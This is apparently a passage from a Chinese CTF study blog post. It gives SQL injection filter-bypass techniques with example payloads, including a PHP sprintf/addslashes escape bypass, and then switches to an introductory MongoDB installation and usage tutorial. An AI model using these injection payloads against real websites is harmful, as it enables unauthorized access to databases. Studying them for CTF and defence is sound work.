class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    blind_sql_injection()</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250912153602799.png" alt="image-20250912153602799"></p>
<h2 id="bypass技巧"><a href="#bypass技巧" class="headerlink" title="bypass技巧"></a>bypass技巧</h2><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>第一个就是返回内容的过滤</p>
<p>1.可以用编码函数去绕过（使用hex或者使用reverse、to_base64等函数加密）</p>
<p>例如题目过滤了flag关键字</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,hex(username),<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user3 <span class="keyword">where</span> username = <span class="string">&#x27;flag&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<p>2.可以用like模糊匹配去绕过</p>
<p>例如题目过滤了flag关键字</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;||(username)like&#x27;</span>fla_或者是-<span class="number">1</span><span class="string">&#x27;||(username)like&#x27;</span>fla<span class="comment">%</span></span><br></pre></td></tr></table></figure>

<p>第二个就是查询语句的过滤</p>
<ul>
<li>大小写绕过</li>
</ul>
<p>在mysql中测试一下发现mysql对查询语句的大小写不敏感</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250502133652917.png" alt="image-20250502133652917"></p>
<p>所以如果waf中不对大小写进行过滤的话，我们可以用大小写去绕过select等字词的关键字过滤</p>
<ul>
<li>双写绕过</li>
</ul>
<p>如果waf只是对关键字进行替换为空的话，可以使用双写去绕过</p>
<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>空格可以用编码或者联合注释符(&#x2F;**&#x2F;)去绕过</p>
<p>在本地测试一下</p>
<ul>
<li>联合注释符</li>
</ul>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502134808478.png" alt="image-20250502134808478"></p>
<ul>
<li>编码绕过：<code>%09</code>,<code>%0a</code>,<code>%0b</code>,<code>%0c</code>,<code>%0d</code>都可以</li>
</ul>
<p>因为在url编码中这些都可以代替空格，但是在mysql语句中这些则不是</p>
<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250502135045046.png" alt="image-20250502135045046"></p>
<ul>
<li>括号绕过：即添加括号代替空格</li>
</ul>
<h3 id="绕过逗号过滤"><a href="#绕过逗号过滤" class="headerlink" title="绕过逗号过滤"></a>绕过逗号过滤</h3><p>from to</p>
<p>例如我们在盲注的时候往往都会截取字符，就会用到切片函数，这些函数都会用到逗号，所以我们可以</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">substr</span>(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(<span class="keyword">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>其实翻译过来也很简单，就是从1到1</p>
<h3 id="绕过and和or过滤"><a href="#绕过and和or过滤" class="headerlink" title="绕过and和or过滤"></a>绕过and和or过滤</h3><p>or的话可以用<code>||</code>绕过，and的话可以用<code>&amp;&amp;</code>绕过</p>
<h3 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h3><ul>
<li>用<code>#</code>号的urlencode编码%23</li>
<li>用<code>--+</code>绕过</li>
<li>手动闭合单引号，例如<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>或者<code>?id=1&#39; or &#39;1&#39;=&#39;1&#39; or &#39;</code></li>
</ul>
<h2 id="mysql奇怪的姿势"><a href="#mysql奇怪的姿势" class="headerlink" title="mysql奇怪的姿势"></a>mysql奇怪的姿势</h2><h4 id="1-利用重音字符绕过过滤"><a href="#1-利用重音字符绕过过滤" class="headerlink" title="1.利用重音字符绕过过滤"></a>1.利用重音字符绕过过滤</h4><p>MySQL默认情况不区分重音符号的特性(ctfshow-web-渔人杯-Ez_Mysqli)</p>
<ul>
<li><p>MySQL 的默认字符集通常是 <code>latin1</code>，而默认排序规则是 <code>latin1_swedish_ci</code>。</p>
</li>
<li><p><code>latin1_swedish_ci</code>是一种不区分大小写、不区分重音符号的排序规则。</p>
<p>例如，<code>a</code>、<code>á</code>、<code>à</code>、<code>â</code> 被视为相同的字符。</p>
<p>在默认排序规则下，MySQL 会将带有重音符号的字符视为其基本字符。</p>
</li>
</ul>
<p>例如我们传入?username&#x3D;ā，那么在解码的时候mysql会把ā当成是a去进行查询的</p>
<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250328233832896.png" alt="image-20250328233832896"></p>
<h4 id="2-sprintf-函数绕过sql"><a href="#2-sprintf-函数绕过sql" class="headerlink" title="2.sprintf()函数绕过sql"></a>2.sprintf()函数绕过sql</h4><p>例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话用addslashes函数对传入的参数进行了一定的字符转义，但是问题是这里对name和pass都使用了这个函数，我们应该怎么去绕过这个反斜杠转义呢？</p>
<ul>
<li>sprintf()函数</li>
</ul>
<p><code>sprintf()</code> 函数是 PHP 中用于格式化字符串的一个功能强大的工具。</p>
<p>基础语法</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sprintf</span><span class="params">(format, arg1, arg2, arg++)</span></span></span><br></pre></td></tr></table></figure>

<p>format参数的格式值：</p>
<p>%% - 返回一个百分号 %<br>%b - 二进制数<br>%c - ASCII 值对应的字符<br>%d - 包含正负号的十进制数（负数、0、正数）<br>%e - 使用小写的科学计数法（例如 1.2e+2）<br>%E - 使用大写的科学计数法（例如 1.2E+2）<br>%u - 不包含正负号的十进制数（大于等于 0）<br>%f - 浮点数（本地设置）<br>%F - 浮点数（非本地设置）<br>%g - 较短的 %e 和 %f<br>%G - 较短的 %E 和 %f<br>%o - 八进制数<br>%s - 字符串<br>%x - 十六进制数（小写字母）<br>%X - 十六进制数（大写字母）</p>
<p>这里的话就是我们C语言中常规的输出函数printf，第一个参数format就是占位符格式化字符，后面的就是参数列表</p>
<p>为什么这里有漏洞呢</p>
<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024/image-20250318145612654.png" alt="image-20250318145612654"></p>
<p>在官方文档中可以关注到<code>An integer followed by a dollar sign </code>$<code>, to specify which number argument to treat in the conversion.</code>这句话，意思就是一个数字后面跟着一个dollar美元符号<code>$</code>可以用来表示此处的占位符负责处理第几个参数，例如<code>%1$s</code>表示的就是该占位符处理第一个参数arg1</p>
<p>但是如果format的类型不是规定的格式值，那么就会变为空</p>
<p>所以总结以下两个点:</p>
<ul>
<li><strong>如果 % 符号多于 arg 参数，则我们必须使用占位符。占位符位于 % 符号之后，由数字和 “$” 组成</strong></li>
<li><strong>如果%1$ + 非arg格式类型，程序会无法识别占位符类型，变为空</strong></li>
</ul>
<p>所以我们用这个sprintf函数注入的原理就是通过对format的错误类型让函数替换为空，从而让addslashes函数作用失效</p>
<p>如果我们输入”%\“或者”%1$\“,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%\“,”%1$\“就因为没有经过任何处理而被替换为空。</p>
<p>那我们来看一下怎么实现这一操作</p>
<ul>
<li>无占位符的情况(<code>$\</code>)</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">select * <span class="keyword">from</span> user where username=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>因为这里有百分号所以在sprintf中会被当成是format类型去处理，但是因为<code>$\</code>并不是规定的格式类型，所以这里会被替换成空</p>
<ul>
<li>有占位符的情况(<code>%1$\</code>)</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span> (<span class="string">&quot;%1$&#x27; and 1=1#&quot;</span> );</span><br><span class="line"><span class="comment">//用addslashes函数进行了处理</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span> (<span class="string">&quot;AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$input</span> );</span><br><span class="line"><span class="comment">//对$input与$b进行了拼接</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span> (<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;%s&#x27; <span class="subst">$b</span> &quot;</span>, <span class="string">&#x27;admin&#x27;</span> );</span><br><span class="line"><span class="comment">//$sql = sprintf (&quot;SELECT * FROM user WHERE username=&#x27;%s&#x27; AND password=&#x27;%1$\&#x27; and 1=1#&#x27; &quot;, &#x27;admin&#x27; );</span></span><br><span class="line"><span class="comment">//这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，由于%\是错误的格式类型，那么admin只会出现在%s里，%1$\则为空</span></span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$sql</span> ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="comment">//    SELECT * FROM user WHERE username=&#x27;admin&#x27; AND password=&#x27;&#x27; and 1=1#&#x27; </span></span><br></pre></td></tr></table></figure>

<p>回到题目中，那我们的payload就是</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">name</span>=admin&amp;pass=1%1$&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1--+</span><br></pre></td></tr></table></figure>

<h4 id="3-sql查询加空格以假乱真"><a href="#3-sql查询加空格以假乱真" class="headerlink" title="3.sql查询加空格以假乱真"></a>3.sql查询加空格以假乱真</h4><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。导致我们有时候为了绕过admin的限制传入admin%20可以查询到admin的结果</p>
<h1 id="6nosql注入"><a href="#6nosql注入" class="headerlink" title="6nosql注入"></a>6nosql注入</h1><h2 id="什么是nosql？"><a href="#什么是nosql？" class="headerlink" title="什么是nosql？"></a>什么是nosql？</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/358650.html">https://www.freebuf.com/articles/web/358650.html</a></p>
<p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。他指的不是单单某一种数据库管理系统，而是用于描述一类数据库管理系统，包括键值数据库，列式数据库，文本数据库，图形数据库等。这些系统会使用不同于传统关系型数据库的数据存储模型。NoSQL数据库<strong>提供比传统SQL数据库更宽松的一致性限制</strong>。 通过减少关系约束和一致性检查，<strong>NoSQL数据库提供了更好的性能和扩展性</strong>。 然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，所以潜在影响要大于传统SQL注入。</p>
<p>而MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p>
<h3 id="NSQL数据库类型"><a href="#NSQL数据库类型" class="headerlink" title="NSQL数据库类型"></a>NSQL数据库类型</h3><p>NOSQL主要有四种数据类型，分别是文档数据库，键值数据库，宽列存储数据库和图形数据库。</p>
<ul>
<li><strong>文档数据库</strong>将数据存储在类似于 JSON（JavaScript 对象表示法）对象的文档中。每个文档包含成对的字段和值。这些值通常可以是各种类型，包括字符串、数字、布尔值、数组或对象等，并且它们的结构通常与开发者在代码中使用的对象保持一致。由于字段值类型和强大的查询语言的多样性，因此文档数据库非常适合各种各样的使用案例，并且可以用作通用数据库。它们可以横向扩展以适应大量数据。</li>
<li><strong>键值数据库</strong>是一种较简单的数据库，其中每个项目都包含键和值。通常只能通过引用键来检索值，因此学习如何查询特定键值对通常很简单。键值数据库非常适合需要存储大量数据但无需执行复杂查询来检索数据的使用案例。常见的使用案例包括存储用户首选项或缓存。Redis 和 DynanoDB 是流行的键值数据库。</li>
<li><strong>宽列存储</strong>将数据存储在表、行和动态列中。宽列存储提供了比关系型数据库更大的灵活性，因为不需要每一行都具有相同的列。许多人认为宽列存储是二维键值数据库。宽列存储非常适合需要存储大量数据并且可以预测查询模式的情况。宽列存储通常用于存储物联网数据和用户配置文件数据。Cassandra 和 HBase 是较受欢迎的两种宽列存储。</li>
<li><strong>图形数据库</strong>将数据存储在节点和边中。节点通常存储有关人物、地点和事物的信息，而边缘则存储有关节点之间的关系的信息。在需要遍历关系以查找模式（例如社交网络，欺诈检测和推荐引擎）的使用案例中，图形数据库非常出色。Neo4j 和 JanusGraph 是图形数据库的示例。</li>
</ul>
<p>接下来我们就以MongDB为例，去讲解这个nosql注入</p>
<h2 id="什么是-MongoDB"><a href="#什么是-MongoDB" class="headerlink" title="什么是 MongoDB ?"></a>什么是 MongoDB ?</h2><p>MongoDB 是一个文档型数据库，数据以类似 JSON 的文档形式存储。</p>
<p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p>
<p>MongoDB使用集合（Collections）来组织文档（Documents），每个文档都是由键值对组成的。</p>
<ul>
<li><strong>数据库（Database）</strong>：存储数据的容器，类似于关系型数据库中的数据库。</li>
<li><strong>集合（Collection）</strong>：数据库中的一个集合，类似于关系型数据库中的表。</li>
<li><strong>文档（Document）</strong>：集合中的一个数据记录，类似于关系型数据库中的行（row），以 BSON 格式存储。</li>
</ul>
<h2 id="关于MongDB基础使用"><a href="#关于MongDB基础使用" class="headerlink" title="关于MongDB基础使用"></a>关于MongDB基础使用</h2><table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>数据库</td>
</tr>
<tr>
<td>表格</td>
<td>集合</td>
</tr>
<tr>
<td>行</td>
<td>文档</td>
</tr>
<tr>
<td>列</td>
<td>字段</td>
</tr>
<tr>
<td>表联合</td>
<td>嵌入文档</td>
</tr>
<tr>
<td>主键</td>
<td>主键（MongoDB 提供了 key 为 _id）</td>
</tr>
</tbody></table>
<ul>
<li>数据库(database)</li>
</ul>
<p>一个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs显示所有的数据库的列表</span><br><span class="line">db 显示当前数据库对象或集合</span><br><span class="line"><span class="keyword">use</span> 数据库名</span><br></pre></td></tr></table></figure>

<ul>
<li>集合(collection)</li>
</ul>
<p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
<p><code>show collections</code> 或 <code>show tables</code> 命令可以查看已有集合</p>
<ul>
<li>文档（Document）</li>
</ul>
<p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
<h2 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">更新软件源</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt upgrade -y</span><br><span class="line">导入密钥</span><br><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | <span class="built_in">sudo</span> apt-key add -</span><br><span class="line">添加 MongoDB 的软件源</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu <span class="subst">$(lsb_release -cs)</span>/mongodb-org/6.0 multiverse&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/mongodb-org-6.0.list</span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line">安装 MongoDB</span><br><span class="line"><span class="built_in">sudo</span> apt install -y mongodb-org</span><br><span class="line">启动服务</span><br><span class="line"><span class="built_in">sudo</span> systemctl start mongod</span><br><span class="line">设置开机自启动</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> mongod</span><br><span class="line">检测服务状态</span><br><span class="line"><span class="built_in">sudo</span> systemctl status mongod</span><br></pre></td></tr></table></figure>

<p>安装好后我们打开MongoDB</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mongosh</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250521165019521.png" alt="image-20250521165019521"></p>
<p>然后我们看看版本</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test</span>&gt; <span class="keyword">db</span>.<span class="keyword">version</span>()</span><br><span class="line">6.0.23</span><br></pre></td></tr></table></figure>

<p>成功安装</p>
<h2 id="MongoDB基础语法"><a href="#MongoDB基础语法" class="headerlink" title="MongoDB基础语法"></a>MongoDB基础语法</h2><p>在MongoDB中，数据库的创建是一个简单的过程，当你首次向MongoDB中插入数据时，如果数据库不存在，MongoDB会自动创建它。</p>
<h2 id="1-操作数据库-1"><a href="#1-操作数据库-1" class="headerlink" title="1.操作数据库"></a>1.操作数据库</h2><h3 id="查看数据库列表"><a href="#查看数据库列表" class="headerlink" title="查看数据库列表"></a>查看数据库列表</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>

<h3 id="查看当前使用数据库"><a href="#查看当前使用数据库" class="headerlink" title="查看当前使用数据库"></a>查看当前使用数据库</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">db</span></span><br></pre></td></tr></table></figure>

<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>当你使用 <strong>use</strong> 命令来指定一个数据库时，如果该数据库不存在，MongoDB将自动创建它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use DATABASE_NAME #如果数据库不存在，则创建数据库，否则切连接并换到指定数据库</span><br></pre></td></tr></table></figure>

<p>举个例子</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test</span>&gt; <span class="keyword">use</span> helloworld</span><br><span class="line">switched to <span class="keyword">db</span> helloworld</span><br><span class="line">helloworld&gt; <span class="keyword">db</span></span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>

<p>但是我们在show dbs的时候并不会看到现在创建的数据库</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">helloworld</span>&gt; show dbs</span><br><span class="line"><span class="attribute">admin</span>   <span class="number">40</span>.<span class="number">00</span> KiB</span><br><span class="line"><span class="attribute">config</span>  <span class="number">60</span>.<span class="number">00</span> KiB</span><br><span class="line"><span class="attribute">local</span>   <span class="number">40</span>.<span class="number">00</span> KiB</span><br></pre></td></tr></table></figure>

<p>要显示它，我们需要向 runoob 数据库插入一些数据。</p>
<h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><p>如果你需要删除数据库，可以使用 <strong>db.dropDatabase()</strong> 方法：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> myDatabase</span><br><span class="line"><span class="keyword">db</span>.dropDatabase()</span><br></pre></td></tr></table></figure>

<p>需要注意的是，当我们没有指定数据库的时候，系统默认是test数据库，所有的操作都是指向test数据库的</p>
<h2 id="2-操作集合"><a href="#2-操作集合" class="headerlink" title="2.操作集合"></a>2.操作集合</h2><h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><p>使用 <code>createCollection()</code> 方法来创建集合</p>
<p>基础语法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(<span class="type">name</span>, <span class="keyword">options</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>name：要创建的集合名称</li>
<li>options：可选参数，指定有关内存大小及索引的选项</li>
</ul>
<p>关于options的参数</p>
<p>摘录自<a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-create-collection.html">菜鸟教程</a></p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">类型</th>
<th align="left">描述</th>
<th align="left">示例值</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>capped</code></td>
<td align="left">布尔值</td>
<td align="left">是否创建一个固定大小的集合。</td>
<td align="left"><code>true</code></td>
</tr>
<tr>
<td align="left"><code>size</code></td>
<td align="left">数值</td>
<td align="left">集合的最大大小（以字节为单位）。仅在 <code>capped</code> 为 true 时有效。</td>
<td align="left"><code>10485760</code> (10MB)</td>
</tr>
<tr>
<td align="left"><code>max</code></td>
<td align="left">数值</td>
<td align="left">集合中允许的最大文档数。仅在 <code>capped</code> 为 true 时有效。</td>
<td align="left"><code>5000</code></td>
</tr>
<tr>
<td align="left"><code>validator</code></td>
<td align="left">对象</td>
<td align="left">用于文档验证的表达式。</td>
<td align="left"><code>&#123; $jsonSchema: &#123; ... &#125;&#125;</code></td>
</tr>
<tr>
<td align="left"><code>validationLevel</code></td>
<td align="left">字符串</td>
<td align="left">指定文档验证的严格程度。 <code>&quot;off&quot;</code>：不进行验证。 <code>&quot;strict&quot;</code>：插入和更新操作都必须通过验证（默认）。 <code>&quot;moderate&quot;</code>：仅现有文档更新时必须通过验证，插入新文档时不需要。</td>
<td align="left"><code>&quot;strict&quot;</code></td>
</tr>
<tr>
<td align="left"><code>validationAction</code></td>
<td align="left">字符串</td>
<td align="left">指定文档验证失败时的操作。 <code>&quot;error&quot;</code>：阻止插入或更新（默认）。 <code>&quot;warn&quot;</code>：允许插入或更新，但会发出警告。</td>
<td align="left"><code>&quot;error&quot;</code></td>
</tr>
<tr>
<td align="left"><code>storageEngine</code></td>
<td align="left">对象</td>
<td align="left">为集合指定存储引擎配置。</td>
<td align="left"><code>&#123; wiredTiger: &#123; ... &#125;&#125;</code></td>
</tr>
<tr>
<td align="left"><code>collation</code></td>
<td align="left">对象</td>
<td align="left">指定集合的默认排序规则。</td>
<td align="left"><code>&#123; locale: &quot;en&quot;, strength: 2 &#125;</code></td>
</tr>
</tbody></table>
<p>举个例子，我们在数据库中创建一个集合</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test</span>&gt; <span class="keyword">use</span> helloworld</span><br><span class="line">switched to <span class="keyword">db</span> helloworld</span><br><span class="line">helloworld&gt; <span class="keyword">db</span>.createCollection(<span class="string">&quot;users&quot;</span>)</span><br><span class="line">&#123; ok: 1 &#125;</span><br></pre></td></tr></table></figure>

<h3 id="查看集合"><a href="#查看集合" class="headerlink" title="查看集合"></a>查看集合</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure>

<p>这两个命令都可以</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">helloworld&gt; <span class="keyword">show</span> collections</span><br><span class="line">users</span><br><span class="line">helloworld&gt; <span class="keyword">show</span> <span class="keyword">tables</span></span><br><span class="line">users</span><br></pre></td></tr></table></figure>

<h3 id="更新集合名"><a href="#更新集合名" class="headerlink" title="更新集合名"></a>更新集合名</h3><p>在 MongoDB 中，不能直接通过命令来重命名集合。需要使用renameCollection 方法来重命名集合。</p>
<h4 id="renameCollection-方法"><a href="#renameCollection-方法" class="headerlink" title="renameCollection 方法"></a>renameCollection 方法</h4><p>renameCollection 方法在 MongoDB 的 admin 数据库中运行，可以将一个集合重命名为另一个名称。</p>
<p>语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db.adminCommand(&#123;</span><br><span class="line">  renameCollection: &quot;sourceDb.sourceCollection&quot;,</span><br><span class="line">  <span class="keyword">to</span>: &quot;targetDb.targetCollection&quot;,</span><br><span class="line">  dropTarget: <span class="operator">&lt;</span><span class="type">boolean</span><span class="operator">&gt;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><strong>renameCollection</strong>：要重命名的集合的完全限定名称（包括数据库名）。</li>
<li><strong>to</strong>：目标集合的完全限定名称（包括数据库名）。</li>
<li><strong>dropTarget</strong>（可选）：布尔值。如果目标集合已经存在，是否删除目标集合。默认值为 <code>false</code>。</li>
</ul>
<p>我们本地尝试一下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">helloworld<span class="operator">&gt;</span> db.adminCommand(&#123;</span><br><span class="line">... renameCollection:&quot;helloworld.users&quot;,</span><br><span class="line">... <span class="keyword">to</span>:&quot;helloworld.users1&quot;</span><br><span class="line">... &#125;);</span><br><span class="line">&#123; ok: <span class="number">1</span> &#125;</span><br><span class="line">helloworld<span class="operator">&gt;</span> <span class="keyword">show</span> tables</span><br><span class="line">users1</span><br></pre></td></tr></table></figure>

<p>我们也可以将集合重命名到另一个数据库</p>
